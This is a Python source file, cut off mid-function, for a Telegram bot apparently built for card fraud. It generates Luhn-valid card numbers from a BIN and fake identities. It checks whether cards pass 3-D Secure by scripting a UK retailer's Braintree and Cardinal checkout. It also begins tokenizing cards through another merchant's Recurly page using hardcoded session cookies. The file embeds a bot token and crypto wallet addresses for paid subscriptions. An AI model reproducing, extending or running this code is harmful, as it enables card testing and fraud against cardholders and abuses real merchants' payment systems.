import telebot,json,string,random,time,traceback,requests,pycountry,flagz,threading,re,user_agent
from telebot import types
from datetime import datetime, timedelta
bot = telebot.TeleBot('6816213439:AAHOLjxo78alD2zY42pkcjgDX7MhkI16I88', parse_mode='HTML')
group='x8_es'
#In the above variable you will put your group ID 
botuser='Xzcaubot'
#You will put the bot ID in it 
userdeve='The_E4'
#Here you will enter the developer's username 
namebot='Vclub'
#Here is the name of the bot 
owner=5267630441
admin=5267630441
#Here is the admin ID and the ID of the developer or owner of the bot 
trc='TFdNRJuEcCssv8jzLbiqioSS4QZSmkZudq'
lit='LVCu1Nx3krXzxfwT7rU2Ke7CgNKWSdQyiT'
def generate_credit_card(message, bot,ko):
	try:
		match = re.search(r'(\d{6,16})\D*(\d{1,2}|xx)?\D*(\d{2,4}|xx)?\D*(\d{3,4}|xxx)?', message.text)
		if match:
			card_number = match.group(1)
			if len(card_number) < 6 or card_number[0] not in ['4', '5', '3', '6']:
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>BIN not recognized. Please enter a valid BIN ❌</b>''',parse_mode="HTML")
				return
			bin = card_number[:6]
			response_message = ""
			for _ in range(10):
				month = int(match.group(2)) if match.group(2) and match.group(2) != 'xx' else random.randint(1, 12)
				year = int(match.group(3)) if match.group(3) and match.group(3) != 'xx' else random.randint(2025, 2029)
				if card_number[:1] == "3":
					cvv = int(match.group(4)) if match.group(4) and match.group(4) != 'xxx' else random.randint(1000, 9999)
				elif card_number[:1] == "5" or card_number[:1] == "4" or card_number[:1] == "6":
					cvv = int(match.group(4)) if match.group(4) and match.group(4) != 'xxx' else random.randint(100, 999)
				
				credit_card_info = generate_credit_card_info(card_number, month, year, cvv)
				response_message += f"<code>{credit_card_info}</code>\n"
			
			brand, type, bank, country_name, country_flag, status = info(credit_card_info.split('|')[0])
			bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= f"𝐁𝐈𝐍 ➜  {bin}\n\n{response_message}\n𝐁𝐈𝐍 𝐈𝐧𝐟𝐨 ➜ {brand} - {type}\n𝐁𝐚𝐧𝐤 ➜  {bank}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country_name} - {country_flag}")

		else:
			bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>Invalid input. Please provide a BIN (Bank Identification Number) that is at least 6 digits but not exceeding 16 digits. 
Example: <code>/gen 412236xxxx |08|2028|xxx</code></b>''',parse_mode="HTML")

	except IndexError:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= "<b>BIN not recognized. Please enter a valid BIN ❌</b>")

#Here is your payment information for which you will receive subscription money
@bot.message_handler(func=lambda message: message.text.lower().startswith('.bin') or message.text.lower().startswith('/bin'))
def respond_to_vbv(message):
		try:
			bm = message.reply_to_message.text
		except:
		   bm=message.text
		regex = r'\d+'
		try:
			matches = re.findall(regex, bm)
		except:
			bot.reply_to(message,'<b>🚫 Incorrect input. Please provide a 6-digit BIN number.</b>',parse_mode="HTML")
			return
		bin = ''.join(matches)[:6]
		ko = (bot.reply_to(message, "<b>Checking Your bin...⌛</b>",parse_mode="HTML").message_id)
		if len(re.findall(r'\d', bin)) >= 6:
			pass
		else:
			bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Incorrect input. Please provide a 6-digit BIN number.</b>''',parse_mode="HTML")
			return
		cc = gen(bin)
		brand, card_type, bank, country, country_flag, status = info(cc.split('|')[0])		
		if 'card_number_invalid' in status:
			msg='<b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 ❌</b>'
		else:
			msg=f'''<b>
𝐕𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 ✅
	
𝐁𝐈𝐍 ➜ <code>{bin[:6]}</code>
	
𝐁𝐈𝐍 𝐈𝐧𝐟𝐨 ➜ {card_type} - {brand}  
𝐁𝐚𝐧𝐤 ➜ {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} - {country_flag}</b> '''
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg,parse_mode="HTML")
def generate_credit_card_info(card_number, expiry_month, expiry_year, cvv):
	generated_num = str(card_number)
	if card_number[:1] == "5" or card_number[:1] == "4" or card_number[:1] == "6":
		while len(generated_num) < 15:
			generated_num += str(random.randint(0, 9))
		check_digit = generate_check_digit(generated_num)
		credit_card_number = generated_num + str(check_digit)
		return f"{credit_card_number}|{str(expiry_month).zfill(2)}|{str(expiry_year)[-2:]}|{cvv}"
	elif card_number[:1] == "3":
		while len(generated_num) < 14:
			generated_num += str(random.randint(0, 9))
		check_digit = generate_check_digit(generated_num)
		credit_card_number = generated_num + str(check_digit)
		return f"{credit_card_number}|{str(expiry_month).zfill(2)}|{str(expiry_year)[-2:]}|{cvv}"
def generate_check_digit(num):
	num_list = [int(x) for x in num]
	for i in range(len(num_list) - 1, -1, -2):
		num_list[i] *= 2
		if num_list[i] > 9:
			num_list[i] -= 9
	return (10 - sum(num_list) % 10) % 10
def luhn_checksum(card_number):
	digits = [int(x) for x in card_number]
	odd_digits = digits[-1::-2]
	even_digits = digits[-2::-2]
	checksum = sum(odd_digits)
	for digit in even_digits:
		checksum += sum(divmod(digit * 2, 10))
	return checksum % 10



def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}
def gen(bin):
	remaining_digits = 16 - len(bin)
	card_number = bin + ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits - 1)])
	digits = [int(digit) for digit in card_number]
	for i in range(len(digits)):
		if i % 2 == 0:
			digits[i] *= 2
			if digits[i] > 9:
				digits[i] -= 9
	
	checksum = sum(digits)
	checksum %= 10
	checksum = 10 - checksum
	if checksum == 10:
		checksum = 0
	card_number += str(checksum)
	return card_number

@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	def my_function():
		user_id = message.from_user.id
		gate='3DS Lookup'
		id=message.from_user.id
		try:
			cc = message.reply_to_message.text
		except:
		   cc=message.text
		cc=str(reg(cc))
		if cc == 'None':
			bot.reply_to(message, '''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
			return
		username = message.from_user.first_name
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		res=(json_data['/vbv'])
		if 'OFF' == res:
			bot.reply_to(message,'<b>The Gate Is Under Maintenance 🔧⚙️</b>',parse_mode="HTML")
			return
		ko = (bot.reply_to(message, f"<b>Checking Your Card...⌛</b>",parse_mode="HTML").message_id)
		start_time = time.time()
		try:
			last = str(vbv(cc))
		except Exception as e:
			print('ERROR : ',e)
			last='Error'
		try: 	headers = {
		'authorization': 'pk_q3mszgnusk66c24k7loecckxtaf',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
	};json_data = {
		'type': 'card',
		'number': cc.split('|')[0],
		'expiry_month': 5,
		'expiry_year': 2024,
		'cvv': '421',
		'name': 'JOHN HARGROVE',
		'phone': {},
		'preferred_scheme': '',
		'requestSource': 'JS',
	};data = requests.post('https://api.checkout.com/tokens', headers=headers, json=json_data).json()
		except: pass
		try:
			brand = data['scheme']
		except:
			brand = 'Unknown'
		try:
			card_type = data['card_type']
		except:
			card_type = 'Unknown'
		try:
			country = data['issuer_country']
			country_flag =flagz.by_code(country)
		except:
			country = 'Unknown'
			country_flag = 'Unknown'
		try:
			bank = data['issuer']
		except:
			bank = 'Unknown'
		end_time = time.time()
		execution_time = end_time - start_time
		if 'Successful' in last or 'Unavailable' in last or 'successful' in last:
			status='𝐏𝐚𝐬𝐬𝐞𝐝 ✅'
		else:
			status='𝐑𝐞𝐣𝐞𝐜𝐭𝐞𝐝 ❌'
		msg=f'''<b>{status}
			
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐑𝐞𝐬𝐮𝐥𝐭 ➜ {last}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ {gate}
	
𝐁𝐈𝐍 ➜ {cc[:6]} - {card_type} - {brand} 
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} - {country_flag} 
𝐁𝐚𝐧𝐤 ➜ {bank}

𝟯𝐃 𝐋𝐨𝐨𝐤𝐮𝐩 ➜ {vbv(cc)}
𝐓𝐢𝐦𝐞 {"{:.1f}".format(execution_time)} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬</b>'''
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
#
@bot.message_handler(func=lambda message: message.text.lower().startswith('.fake') or message.text.lower().startswith('/fake'))
def respond_to_vbv(message):
	def my_function():
		try:
			try:
				u=message.text.split('fake ')[1]
			except:
				u='US'
			parsed_data = requests.get(f'https://randomuser.me/api/?nat={u}').json()
			results = parsed_data['results']
			result = results[0]
			name = f"{result['name']['title']} {result['name']['first']} {result['name']['last']}"
			street_number = result['location']['street']['number']
			street_name = result['location']['street']['name']
			city = result['location']['city']
			state = result['location']['state']
			country = result['location']['country']
			postcode = result['location']['postcode']
			fake = Faker()
			phone = fake.phone_number()
			email = fake.email()
			formatted_address = f"""<b>
{country} Address
Name: <code>{name}</code>
City: <code>{city}</code>
state: <code>{state}</code>
Zip Code: <code>{postcode}</code>
Street: <code>{street_number} {street_name}</code>
Phone: <code>{phone}</code>
Email: {email}</b>
			"""
			bot.reply_to(message, formatted_address,parse_mode="HTML")
		except:
			bot.reply_to(message, "Country code not found or not available.")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
def gen(bin):
	remaining_digits = 16 - len(bin)
	card_number = bin + ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits - 1)])
	digits = [int(digit) for digit in card_number]
	for i in range(len(digits)):
		if i % 2 == 0:
			digits[i] *= 2
			if digits[i] > 9:
				digits[i] -= 9
	
	checksum = sum(digits)
	checksum %= 10
	checksum = 10 - checksum
	if checksum == 10:
		checksum = 0
	card_number += str(checksum)
	return card_number
@bot.message_handler(func=lambda message: message.text.lower().startswith('.gen') or message.text.lower().startswith('/gen'))
def respond_to_vbv(message):
	ko = (bot.reply_to(message, "<b>Generating cards...⌛</b>",parse_mode="HTML").message_id)
	generate_credit_card(message,bot,ko)
#دي عشان تفحص اذا كانت الفيزا otp او لا 
def vbv(ccx):
	import requests,re,base64,jwt,json
	cc=ccx
	def get_ref():
		current_time = datetime.now()
		future_time = current_time + timedelta(hours=2)
		future_time_str = future_time.strftime('%Y-%m-%d %H:%M')
		with open('datetime.txt', 'w') as file:
		    file.write(future_time_str)
		with open('gates.json', 'r') as file:
			json_dataa = json.load(file)
		cookies = {
		    'PHPSESSID': '52151a5eccd3a0401cd3f5352278c6be'
		}
		headers = {
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		response = requests.get('https://www.sportfish.co.uk/checkout/', cookies=cookies, headers=headers)
		no=re.findall(r'"clientToken":"(.*?)"',response.text)[0]
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		print(au)
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'authorization': f'Bearer {au}',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': 'e4ea0503-2df6-459c-b10c-f2c18dd8bccd',
		    },
		    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
		    'operationName': 'ClientConfiguration',
		}
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
		headers = {
		    'authority': 'centinelapi.cardinalcommerce.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json;charset=UTF-8',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'x-cardinal-tid': 'Tid-254fb674-0925-4e3e-9afa-fa4d4326757d',
		}#تم التحديث
		json_data = {
		    'BrowserPayload': {
		        'Order': {
		            'OrderDetails': {},
		            'Consumer': {
		                'BillingAddress': {},
		                'ShippingAddress': {},
		                'Account': {},
		            },
		            'Cart': [],
		            'Token': {},
		            'Authorization': {},
		            'Options': {},
		            'CCAExtension': {},
		        },
		        'SupportsAlternativePayments': {
		            'cca': True,
		            'hostedFields': False,
		            'applepay': False,
		            'discoverwallet': False,
		            'wallet': False,
		            'paypal': False,
		            'visacheckout': False,
		        },
		    },
		    'Client': {
		        'Agent': 'SongbirdJS',
		        'Version': '1.35.0',
		    },
		    'ConsumerSessionId': None,
		    'ServerJWT': cardnal,
		}
		response = requests.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
		payload = response.json()['CardinalJWT']
		payload_dict = jwt.decode(payload, options={"verify_signature": False})
		ref = payload_dict['ReferenceId']
		json_dataa['up']['re']=ref
		json_dataa['up']['au']=au
		with open('gates.json', 'w') as json_file:
			json.dump(json_dataa, json_file, ensure_ascii=False, indent=4)
		headers = {
		    'authority': 'geo.cardinalcommerce.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json',
		    'origin': 'https://geo.cardinalcommerce.com',
		    'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5f45accd4c6a414cafc1ae4e&tmEventType=PAYMENT&referenceId={ref}&geolocation=false&origin=Songbird',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'x-requested-with': 'XMLHttpRequest',
		}
		json_data = {
		    'Cookies': {
		        'Legacy': True,
		        'LocalStorage': True,
		        'SessionStorage': True,
		    },
		    'DeviceChannel': 'Browser',
		    'Extended': {
		        'Browser': {
		            'Adblock': True,
		            'AvailableJsFonts': [],
		            'DoNotTrack': 'unknown',
		            'JavaEnabled': False,
		        },
		        'Device': {
		            'ColorDepth': 24,
		            'Cpu': 'unknown',
		            'Platform': 'Linux armv81',
		            'TouchSupport': {
		                'MaxTouchPoints': 5,
		                'OnTouchStartAvailable': True,
		                'TouchEventCreationSuccessful': True,
		            },
		        },
		    },
		    'Fingerprint': '4291e9424912bfb097796e676a43a259',
		    'FingerprintingTime': 1249,
		    'FingerprintDetails': {
		        'Version': '1.5.1',
		    },
		    'Language': 'en-US',
		    'Latitude': None,
		    'Longitude': None,
		    'OrgUnitId': '5f45accd4c6a414cafc1ae4e',
		    'Origin': 'Songbird',
		    'Plugins': [],
		    'ReferenceId': ref,
		    'Referrer': 'https://www.sportfish.co.uk/',
		    'Screen': {
		        'FakedResolution': False,
		        'Ratio': 2.2213740458015265,
		        'Resolution': '873x393',
		        'UsableResolution': '873x393',
		        'CCAScreenSize': '02',
		    },
		    'CallSignEnabled': None,
		    'ThreatMetrixEnabled': False,
		    'ThreatMetrixEventType': 'PAYMENT',
		    'ThreatMetrixAlias': 'Default',
		    'TimeOffset': -120,
		    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		    'UserAgentDetails': {
		        'FakedOS': False,
		        'FakedBrowser': False,
		    },
		    'BinSessionId': 'add5c63e-e8fb-4e9c-a235-b13f64a74f69',
		}
		response = requests.post(
		    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
		    headers=headers,
		    json=json_data,
		)
		hi=result(cc)
		return hi
	def result(cc):
		with open('datetime.txt', 'r') as file:
		    saved_time_str = file.read().strip()
		saved_time = datetime.strptime(saved_time_str, '%Y-%m-%d %H:%M')
		current_time = datetime.now()
		if current_time >= saved_time:
			return get_ref()
		else:
			pass
		n=cc.split('|')[0]
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		au=(json_data['up']['au'])
		ref=(json_data['up']['re'])
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'authorization': f'Bearer {au}',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://assets.braintreegateway.com',
		    'referer': 'https://assets.braintreegateway.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': 'e4ea0503-2df6-459c-b10c-f2c18dd8bccd',
		    },
		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
		    'variables': {
		        'input': {
		            'creditCard': {
		                'number': n,
		                'expirationMonth': '12',
		                'expirationYear': '2029',
		                'cvv': '982',
		            },
		            'options': {
		                'validate': False,
		            },
		        },
		    },
		    'operationName': 'TokenizeCreditCard',
		}
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		try:
			tok = response.json()['data']['tokenizeCreditCard']['token']
		except:
			get_ref()
		headers = {
		    'authority': 'api.braintreegateway.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
		    'content-type': 'application/json',
		    'origin': 'https://www.sportfish.co.uk',
		    'referer': 'https://www.sportfish.co.uk/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		json_data = {
		    'amount': '29.99',
		    'additionalInfo': {
		        'billingLine1': '10 Sillerton House',
		        'billingLine2': '16 Albyn Terrace',
		        'billingCity': 'Aberdeen',
		        'billingState': '',
		        'billingPostalCode': 'AB10 1YP',
		        'billingCountryCode': 'US',
		        'billingPhoneNumber': '9108749652',
		        'billingGivenName': '\\u006a\\u0061\\u0063\\u006b\\u0073\\u006f\\u006e',
		        'billingSurname': '\\u004d\\u0061\\u0067\\u0065\\u006e\\u0074\\u006f',
		    },
		    'challengeRequested': True,
		    'bin': '493452',
		    'dfReferenceId': ref,
		    'clientMetadata': {
		        'requestedThreeDSecureVersion': '2',
		        'sdkVersion': 'web/3.94.0',
		        'cardinalDeviceDataCollectionTimeElapsed': 560,
		        'issuerDeviceDataCollectionTimeElapsed': 669,
		        'issuerDeviceDataCollectionResult': True,
		    },
		    'authorizationFingerprint': au,
		    'braintreeLibraryVersion': 'braintree/web/3.94.0',
		    '_meta': {
		        'merchantAppId': 'www.sportfish.co.uk',
		        'platform': 'web',
		        'sdkVersion': '3.94.0',
		        'source': 'client',
		        'integration': 'custom',
		        'integrationType': 'custom',
		        'sessionId': 'e4ea0503-2df6-459c-b10c-f2c18dd8bccd',
		    },
		}
		response = requests.post(
		    f'https://api.braintreegateway.com/merchants/fs8wxy78pkvx72rh/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
		    headers=headers,
		    json=json_data,
		)
		try:
			string=response.json()['paymentMethod']['threeDSecureInfo']['status']
		except:
			return 'Error'
		formatted_string = string.replace("_", " ").title()
		otp=(formatted_string)
		if 'Successful' in otp or 'Unavailable' in  otp or 'successful' in otp:
			return otp+' ✅'
		else:
			return otp+' ❌'
	return result(cc)
#دي عشان تحسب المستخدم استخدم الامر كام مره في الساعه وتحظرو لمده ساعه لو اتخطي ال30 محاوله
def check_command_limit(user_id):
	current_time = datetime.now()
	if user_id not in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}
	if command_usage[user_id]['last_time'] is None or (current_time - command_usage[user_id]['last_time']).seconds > 3600:
		command_usage[user_id]['count'] = 0
	if command_usage[user_id]['count'] >= 30:
		next_hour = command_usage[user_id]['last_time'] + timedelta(hours=1)
		time_until_next_hour = (next_hour - current_time).seconds // 60
		return False, time_until_next_hour
	
	return True, None
	
#دي عشان تحسب عدد استخدام الاوامر بالنسبه للناس الfree 
command_usage = {}
#هنا هنضيف الدوال اللي هتتعامل مع البطاقات زي دوال الفحص والفلتره
#داله جلب معلومات البطاقه
def info(card):
	if '3' == card[:1]:
		cvc=7706
	else:
		cvc=770
	headers = {
							'authorization': 'pk_q3mszgnusk66c24k7loecckxtaf',
							'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
						};json_data = {
							'type': 'card',
							'number': card,
							'expiry_month': 5,
							'expiry_year': 2024,
							'cvv': cvc,
							'name': 'JOHN HARGROVE',
							'phone': {},
							'preferred_scheme': '',
							'requestSource': 'JS',
						};response = requests.post('https://api.checkout.com/tokens', headers=headers, json=json_data)
	data = ['scheme', 'card_type', 'issuer']
	result = []
	for field in data:
		try:
			result.append(response.json()[field])
		except:
			result.append("------")
	try:
		us=response.json()['issuer_country']
		country=pycountry.countries.get(alpha_2=us).name
		result.append(country)
	except:
		result.append('----')
	try:
		us=response.json()['issuer_country']
		result.append(flagz.by_code(us))
	except:
		result.append('----')
	if 'card_number_invalid' in response.text:
		result.append('card_number_invalid')
	else:
		result.append('')
	return tuple(result)
#هنا هضيف داله فحص بايبال
def am(card):
	import re
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	import requests,json
	
	headers = {
	    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
	    'Accept': '*/*',
	    'Accept-Language': 'en-US,en;q=0.5',
	    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
	    'Content-type': 'application/x-www-form-urlencoded',
	    'Origin': 'https://api.recurly.com',
	    'Connection': 'keep-alive',
	    'Referer': 'https://api.recurly.com/js/v1/field.html',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'Pragma': 'no-cache',
	    'Cache-Control': 'no-cache',
	    # Requests doesn't support trailers
	    # 'TE': 'trailers',
	}
	
	data = {
	    'first_name': 'nh kuhyj',
	    'last_name': 'kjhbkj',
	    'email': 'safgsdgf@nsdewg.dewfr',
	    'phone': '70223356786',
	    'address1': 'safgsdgfnsdewg.dewfr',
	    'address2': 'hgjg.uk',
	    'city': 'ny',
	    'state': 'New York',
	    'postal_code': '10022',
	    'country': 'us',
	    'number': n,
	    'browser[color_depth]': '24',
	    'browser[java_enabled]': 'false',
	    'browser[language]': 'en-US',
	    'browser[referrer_url]': 'https://go.ignitionapp.com/account/subscription/core2024/monthly',
	    'browser[screen_height]': '768',
	    'browser[screen_width]': '1366',
	    'browser[time_zone_offset]': '-180',
	    'browser[user_agent]': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
	    'month': mm,
	    'year': yy,
	    'cvv': cvc,
	    'version': '4.29.4',
	    'key': 'sjc-wlk5T4e1AoeQfMYPIBPA90',
	    'deviceId': 'xsFUvelyd5yf4hdG',
	    'sessionId': 'oGg7omjJlQVQlMfh',
	    'instanceId': 'pWA3nq5lyr3gm4pn'
	}
	
	response = requests.post('https://api.recurly.com/js/v1/token', headers=headers, data=data)
	id=response.json()['id']
	import requests
	
	cookies = {
	    'ajs_anonymous_id': '4b51bc37-2691-44a6-835b-e0fbd0234246',
	    'analytics_session_id': '1724906900685',
	    'analytics_session_id.last_access': '1724906917121',
	    '__hstc': '221905351.6f5844f5d74a2e7ed9442c414d4724e4.1724511184024.1724511184024.1724906901571.2',
	    'hubspotutk': '6f5844f5d74a2e7ed9442c414d4724e4',
	    'intercom-id-e6aa18a9fbd667eabb26e9bf2bee1abd15f97d67': 'd7917f1e-48fc-419e-993e-5e3cdc948a40',
	    'intercom-session-e6aa18a9fbd667eabb26e9bf2bee1abd15f97d67': 'MEpyL2xxYm9hQ25xeit0eEUwVXVlVlBNWjJQdnZhOWx1UkZRL1BWYVdRVDNDQzZkYWFBY3M5SmJ4R3RjdjhVOS0tT05RQWNTL1AvVllSQzFZZFJkRUNxZz09--d67cf5726772acbfc672bf5132a506fdfe46eb3e',
	    'intercom-device-id-e6aa18a9fbd667eabb26e9bf2bee1abd15f97d67': 'a4d320a6-9675-4885-ab7c-5696cde5a8cf',
	    '_gcl_au': '1.1.1139833418.1724511214.167647226.1724906968.1724907622',
	    'ajs_user_id': '227855',
	    '_fbp': 'fb.1.1724511217759.301623031231626998',
	    '_session_id': 'c48863660ed184f0219e2aaa15068de3',
	    'sea_surf': '3il71jO28T9EWWouVbzJPyIRQPRIjMbB8c6onC9HTA108SiGlqnjYo17v4CqYUyiV98rQWVbabkvFwGm6GYudQ',
	    '__hssrc': '1',
	    '__hssc': '221905351.2.1724906901571',
	    'amp_session_id': '1724906900685',
	}
	
	headers = {
	    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
	    'Accept': '*/*',
	    'Accept-Language': 'en-US,en;q=0.5',
	    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
	    'Referer': 'https://go.ignitionapp.com/account/subscription/core2024/monthly',
	    'X-CSRF-Token': '3il71jO28T9EWWouVbzJPyIRQPRIjMbB8c6onC9HTA108SiGlqnjYo17v4CqYUyiV98rQWVbabkvFwGm6GYudQ',
	    'content-type': 'application/json',
	    'sentry-trace': '968dc7cac1244179ad94eb4af1070473-935388489571ae29-0',
	    'baggage': 'sentry-environment=production,sentry-release=e4d32f8689e83af328f093e871cc902c4ca2824e,sentry-public_key=21a7ed05d9ce40be8522813224b288f3,sentry-trace_id=968dc7cac1244179ad94eb4af1070473,sentry-sample_rate=0.05,sentry-sampled=false',
	    'Origin': 'https://go.ignitionapp.com',
	    'Connection': 'keep-alive',
